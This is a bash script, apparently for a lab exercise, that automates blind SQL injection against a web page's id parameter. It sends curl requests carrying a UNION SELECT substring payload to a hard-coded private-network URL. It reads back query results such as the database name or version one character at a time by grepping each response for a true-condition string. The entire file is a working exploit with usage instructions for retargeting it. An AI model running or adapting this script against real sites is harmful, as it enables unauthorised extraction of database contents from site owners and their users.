#!/bin/bash
echo 'Edit the $URL,$truestring and curl command before you use it. Basically change almost everything :) '
echo 'Usage: ./SQLblind.sh max-length '\''query'\'''
echo 'Eg. ./SQLblind.sh 20 '\''database()'\'' '
echo 'Eg. ./SQLblind.sh 30 '\''@@version'\'''

charset=$(echo {0..9} {A..z} \. \.. \; \: \- \_ \@)

export URL="http://192.168.92.147/cat.php?id=999"   # specify URL
export truestring='Picture: 1'  # add a string from the output to tell a true condition from a false result (truestcript must be a true condition)
export maxlength=$1
export query=$2

export result=""

echo "extracting the results from query $query..."

for ((j=1;j<$maxlength;j+=1))
do
	export nthchar=$j

	for i in $charset
	do

		curl -i -s -k  -X $'GET' "$URL%20UNION%20SELECT%20null,substring(($query),$nthchar,1)=%27$i%27,null,null;--%20-" | grep "$truestring" &> /dev/null
		if [ "$?" == "0" ]
		then
      echo Character number $nthchar found: $i
      export result+=$i
      break
		fi
	done
done

echo Results: $result

